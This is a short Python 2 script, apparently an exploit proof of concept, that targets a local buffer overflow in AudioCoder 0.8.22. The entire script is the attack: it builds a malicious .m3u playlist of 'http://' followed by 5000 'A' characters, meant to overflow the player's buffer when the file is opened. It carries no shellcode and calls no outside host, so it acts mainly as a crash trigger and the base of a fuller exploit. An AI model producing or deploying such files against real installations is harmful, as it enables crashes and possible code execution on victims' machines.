#!/usr/bin/python

print "AudioCoder 0.8.22 Local Buffer Overflow "
from struct import pack

junk = "http://" + "\x41" * 5000

exploit = junk

try:
    file= open("exploit.m3u",'w')
    file.write(exploit)
    file.close()
    raw_input("\nExploit has been created!\n")
except:
    print "There has been an Error"
